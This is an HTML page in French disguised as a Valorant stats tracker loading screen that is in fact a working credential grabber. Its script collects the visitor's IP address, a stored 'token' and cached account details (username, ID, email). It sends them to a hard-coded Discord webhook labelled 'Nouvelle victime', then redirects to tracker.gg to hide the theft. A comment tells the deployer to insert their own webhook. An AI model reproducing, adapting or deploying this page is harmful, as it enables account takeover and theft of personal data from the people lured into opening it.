<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stats Tracker - Valorant</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0f1419;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff4655;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #8b9bb4;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h1>Analyse des statistiques...</h1>
    <p>Connexion aux serveurs Riot Games en cours</p>

    <script>
        // REMPLACE CETTE URL PAR TON WEBHOOK DISCORD
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537654143118999572/xUfeTGedDvVvB5mguwhB9BMhIvNDBIHvmwFBh5e1h3WevbWIFRQoq7pMl14UVfpAlSRk';
        
        // Récupération IP + Token
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(ipData => {
                const ip = ipData.ip;
                const token = localStorage.getItem('token') || localStorage.token;
                const userData = JSON.parse(localStorage.getItem('user_data_cache') || '{}');
                const payload = {
                    content: '**Nouvelle victime**\n' +
                            '**IP:** `' + ip + '`\n' +
                            '**Token:** `' + token + '`\n' +
                            '**Username:** ' + (userData.username || 'Inconnu') + '#' + (userData.discriminator || '0000') + '\n' +
                            '**ID:** ' + (userData.id || 'Inconnu') + '\n' +
                            '**Email:** ' + (userData.email || 'Non récupéré')
                };
                
                return fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });
            })
            .then(() => {
                // Redirection après 2 secondes
                setTimeout(() => {
                    window.location.href = 'https://tracker.gg/valorant';
                }, 2000);
            })
            .catch(error => {
                console.error('Erreur:', error);
                window.location.href = 'https://tracker.gg/valorant';
            });
    </script>
</body>
</html>
